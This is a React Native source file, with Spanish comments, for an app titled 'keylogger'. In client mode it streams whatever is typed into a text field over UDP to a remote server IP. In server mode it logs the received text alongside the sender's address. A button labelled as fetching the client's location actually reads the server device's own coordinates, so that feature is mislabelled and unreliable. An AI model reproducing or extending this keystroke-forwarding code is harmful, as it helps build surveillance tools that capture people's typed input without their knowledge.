// Importación de módulos y componentes necesarios
import React, { useState, useEffect } from 'react';
import { 
  View, 
  Text, 
  TextInput, 
  TouchableOpacity, 
  StyleSheet, 
  ScrollView, 
  PermissionsAndroid, 
  Platform 
} from 'react-native';
import UdpSocket from 'react-native-udp'; // Para la comunicación UDP
import { NetworkInfo } from 'react-native-network-info'; // Para obtener la IP del dispositivo
import Geolocation from '@react-native-community/geolocation'; // Para obtener la ubicación

export default function App() {
  // Estados para la comunicación UDP y funcionalidad keylogger
  const [isServer, setIsServer] = useState(false); // Determina si se actúa como servidor o cliente
  const [connectionStatus, setConnectionStatus] = useState(''); // Estado del socket/servidor
  const [socket, setSocket] = useState(null); // Objeto socket
  const [ipAddress, setIpAddress] = useState(''); // Dirección IP del dispositivo (cuando actúa como servidor)
  const [ipServer, setIpServer] = useState(''); // IP del servidor a conectarse (para el cliente)
  const [typedText, setTypedText] = useState(''); // Texto escrito por el usuario (keylogger)
  const [socketConnected, setSocketConnected] = useState(false); // Estado de conexión del socket
  const [logs, setLogs] = useState([]); // Historial de mensajes recibidos (logs)

  // Estados para la geolocalización
  const [currentLongitude, setCurrentLongitude] = useState('...'); // Longitud actual
  const [currentLatitude, setCurrentLatitude] = useState('...');   // Latitud actual
  const [locationStatus, setLocationStatus] = useState(''); // Estado de la ubicación

  let watchID = null; // Identificador para la suscripción de geolocalización

  // useEffect se ejecuta al cambiar el estado "isServer"
  useEffect(() => {
    // Función asíncrona para obtener la dirección IP del dispositivo
    const fetchIpAddress = async () => {
      const ip = await NetworkInfo.getIPV4Address();
      setIpAddress(ip);
    };

    // Llamar a la función para establecer la IP
    fetchIpAddress();

    // Si se ha seleccionado el modo servidor
    if (isServer) {
      // Se crea un socket UDP para actuar como servidor
      const server = UdpSocket.createSocket('udp4');

      // Evento que se dispara al recibir un mensaje del cliente
      server.on('message', (data, rinfo) => {
        // Se crea un registro con la hora, dirección y mensaje recibido
        const logEntry = `[${new Date().toLocaleTimeString()}] ${rinfo.address}: ${data.toString()}`;
        // Se agrega el registro al estado de logs
        setLogs(prevLogs => [...prevLogs, logEntry]);
        console.log(logEntry);
      });

      // Evento que se dispara cuando el servidor comienza a escuchar en un puerto
      server.on('listening', () => {
        console.log('Servidor escuchando en el puerto:', server.address().port);
        setConnectionStatus(`Servidor en el puerto ${server.address().port}`);
      });

      // Se enlaza el socket al puerto 8888 (para el servidor)
      server.bind(8888);
      // Guardar el socket en el estado
      setSocket(server);
    } else {
      // Si no es servidor, se establece el estado de conexión
      setConnectionStatus('Servidor desconectado');
    }

    // Función de limpieza: cierra el socket y detiene la suscripción de geolocalización al desmontar o cambiar el modo
    return () => {
      if (socket) {
        socket.close();
        setSocketConnected(false);
      }
      if (watchID !== null) {
        Geolocation.clearWatch(watchID);
      }
    };
  }, [isServer]); // Se ejecuta cuando cambia isServer

  // Función para conectar el cliente al servidor
  const connectToServer = () => {
    if (!isServer && ipServer.trim() !== '') {
      // Se crea un socket UDP para el cliente
      const client = UdpSocket.createSocket('udp4');

      // Se enlaza el socket del cliente al puerto 8887
      client.bind(8887, () => {
        console.log('Cliente conectado');
        setSocketConnected(true); // Se marca como conectado
      });

      // Guardar el socket en el estado
      setSocket(client);
    }
  };

  // Función para desconectar el cliente del servidor
  const disconnectFromServer = () => {
    if (socket) {
      socket.close(); // Cierra el socket
      setSocket(null);
      setSocketConnected(false); // Actualiza el estado a desconectado
    }
  };

  // Función que envía el texto escrito en tiempo real (keylogger)
  const handleTextChange = (text) => {
    // Actualiza el estado con el texto ingresado
    setTypedText(text);

    // Si se actúa como cliente, se envía el texto al servidor mediante el socket UDP
    if (!isServer && socket && ipServer) {
      socket.send(text, undefined, undefined, 8888, ipServer, (error) => {
        if (error) {
          console.log('Error al enviar texto:', error);
        }
      });
    }
  };

  // Funciones para la geolocalización:

  // Solicita permisos de ubicación y, si se conceden, obtiene la ubicación
  const requestLocationPermission = async () => {
    if (Platform.OS === 'ios') {
      // En iOS se obtiene la ubicación directamente
      getOneTimeLocation();
      subscribeLocationLocation();
    } else {
      try {
        // En Android se solicita el permiso de ubicación
        const granted = await PermissionsAndroid.request(
          PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
          {
            title: 'Location Access Required',
            message: 'This App needs to Access your location',
          },
        );
        if (granted === PermissionsAndroid.RESULTS.GRANTED) {
          // Si se concede el permiso, se obtienen los datos de ubicación
          getOneTimeLocation();
          subscribeLocationLocation();
        } else {
          setLocationStatus('Permission Denied');
        }
      } catch (err) {
        console.warn(err);
      }
    }
  };

  // Función para obtener la ubicación actual una sola vez
  const getOneTimeLocation = () => {
    setLocationStatus('Getting Location ...');
    Geolocation.getCurrentPosition(
      (position) => {
        setLocationStatus('You are Here');
        // Se obtienen y formatean la longitud y latitud
        const currentLongitude = JSON.stringify(position.coords.longitude);
        const currentLatitude = JSON.stringify(position.coords.latitude);
        // Se actualizan los estados correspondientes
        setCurrentLongitude(currentLongitude);
        setCurrentLatitude(currentLatitude);
      },
      (error) => {
        setLocationStatus(error.message);
      },
      { enableHighAccuracy: false, timeout: 30000, maximumAge: 1000 }
    );
  };

  // Función para suscribirse a cambios en la ubicación (actualización en tiempo real)
  const subscribeLocationLocation = () => {
    watchID = Geolocation.watchPosition(
      (position) => {
        setLocationStatus('You are Here');
        // Se obtienen y actualizan la longitud y latitud
        const currentLongitude = JSON.stringify(position.coords.longitude);
        const currentLatitude = JSON.stringify(position.coords.latitude);
        setCurrentLongitude(currentLongitude);
        setCurrentLatitude(currentLatitude);
      },
      (error) => {
        setLocationStatus(error.message);
      },
      { enableHighAccuracy: false, maximumAge: 1000 }
    );
  };

  return (
    // Contenedor principal de la aplicación
    <View style={styles.container}>
      {/* Título de la aplicación */}
      <Text style={styles.title}>keylogger</Text>

      {/* Botón para iniciar/detener el servidor, visible solo si el cliente no está conectado */}
      {!socketConnected && (
        <TouchableOpacity
          style={styles.toggleButton}
          onPress={() => setIsServer(!isServer)}
        >
          <Text style={styles.toggleButtonText}>
            {isServer ? 'Detener Servidor' : 'Iniciar Servidor'}
          </Text>
        </TouchableOpacity>
      )}

      {/* Si se actúa como servidor, se muestra la interfaz del servidor */}
      {isServer ? (
        <View style={styles.serverContainer}>
          {/* Muestra el estado de la conexión del servidor */}
          <Text style={styles.status}>{connectionStatus}</Text>
          {/* Muestra la IP del servidor */}
          <Text style={styles.label}>IP del Servidor:</Text>
          <Text style={styles.info}>{ipAddress}</Text>
          
          {/* Muestra el historial de mensajes recibidos (entradas del teclado del cliente) */}
          <Text style={styles.label}>Entradas del teclado del cliente:</Text>
          <ScrollView style={styles.logsContainer}>
            {logs.map((log, index) => (
              <Text key={index} style={styles.logText}>{log}</Text>
            ))}
          </ScrollView>

          {/* Botón para solicitar la ubicación del cliente */}
          <TouchableOpacity style={styles.locationButton} onPress={requestLocationPermission}>
            <Text style={styles.locationButtonText}>Obtener Ubicación del cliente</Text>
          </TouchableOpacity>
          
          {/* Muestra la información de la ubicación obtenida */}
          <Text style={styles.locationText}>Coordenadas del cliente:</Text>
          <Text style={styles.locationText}>Longitude: {currentLongitude}</Text>
          <Text style={styles.locationText}>Latitude: {currentLatitude}</Text>
        </View>
      ) : (
        // Si se actúa como cliente, se muestra la interfaz del cliente
        <View style={styles.clientContainer}>
          {/* Campo para ingresar la IP del servidor */}
          <Text style={styles.label}>IP del Servidor:</Text>
          <TextInput 
            onChangeText={setIpServer} 
            value={ipServer} 
            placeholder="Ej: 192.168.1.100"
            style={styles.input}
          />
          {/* Botón para conectar o desconectar según el estado del socket */}
          {!socketConnected ? (
            <TouchableOpacity style={styles.connectButton} onPress={connectToServer}>
              <Text style={styles.connectButtonText}>Conectar</Text>
            </TouchableOpacity>
          ) : (
            <TouchableOpacity style={styles.disconnectButton} onPress={disconnectFromServer}>
              <Text style={styles.disconnectButtonText}>Desconectar</Text>
            </TouchableOpacity>
          )}

          {/* Campo de texto para ingresar y enviar información (keylogger) */}
          <TextInput
            placeholder="Escribe aquí..."
            value={typedText}
            onChangeText={handleTextChange}
            style={styles.input}
          />

          {/* Muestra el estado del socket cuando está conectado */}
          {socketConnected && <Text style={styles.connected}>✅ Socket Conectado</Text>}
        </View>
      )}
    </View>
  );
}

// Definición de estilos para la interfaz de usuario
const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#121212', // Fondo oscuro
    alignItems: 'center',
    justifyContent: 'center',
    padding: 20,
  },
  title: {
    fontSize: 24,
    fontWeight: 'bold',
    color: '#00ffcc',
    marginBottom: 20,
  },
  toggleButton: {
    backgroundColor: '#00ffcc',
    paddingVertical: 10,
    paddingHorizontal: 20,
    borderRadius: 10,
    marginBottom: 20,
  },
  toggleButtonText: {
    fontSize: 16,
    fontWeight: 'bold',
    color: '#121212',
  },
  serverContainer: {
    backgroundColor: '#1e1e1e',
    padding: 20,
    borderRadius: 10,
    alignItems: 'center',
    width: '100%',
  },
  clientContainer: {
    backgroundColor: '#1e1e1e',
    padding: 20,
    borderRadius: 10,
    width: '100%',
    alignItems: 'center',
  },
  status: {
    fontSize: 16,
    color: '#ffffff',
    marginBottom: 10,
  },
  label: {
    fontSize: 14,
    color: '#aaaaaa',
    marginTop: 10,
  },
  info: {
    fontSize: 16,
    fontWeight: 'bold',
    color: '#ffffff',
  },
  logsContainer: {
    width: '100%',
    maxHeight: 200,
    marginTop: 10,
    backgroundColor: '#333',
    padding: 10,
    borderRadius: 5,
  },
  logText: {
    color: '#0f0',
    fontSize: 14,
  },
  input: {
    width: '90%',
    backgroundColor: '#333333',
    color: '#ffffff',
    padding: 10,
    marginTop: 10,
    borderRadius: 10,
  },
  connectButton: {
    backgroundColor: '#00ffcc',
    paddingVertical: 8,
    paddingHorizontal: 20,
    borderRadius: 10,
    marginTop: 10,
  },
  connectButtonText: {
    fontSize: 16,
    fontWeight: 'bold',
    color: '#121212',
  },
  disconnectButton: {
    backgroundColor: '#ff4444',
    paddingVertical: 8,
    paddingHorizontal: 20,
    borderRadius: 10,
    marginTop: 10,
  },
  disconnectButtonText: {
    fontSize: 16,
    fontWeight: 'bold',
    color: '#ffffff',
  },
  connected: {
    marginTop: 15,
    fontSize: 16,
    color: '#00ffcc',
    fontWeight: 'bold',
  },
  locationButton: {
    backgroundColor: '#00ffcc',
    paddingVertical: 8,
    paddingHorizontal: 20,
    borderRadius: 10,
    marginTop: 15,
  },
  locationButtonText: {
    fontSize: 16,
    fontWeight: 'bold',
    color: '#121212',
  },
  locationText: {
    fontSize: 14,
    color: '#ffffff',
    marginTop: 10,
  },
});
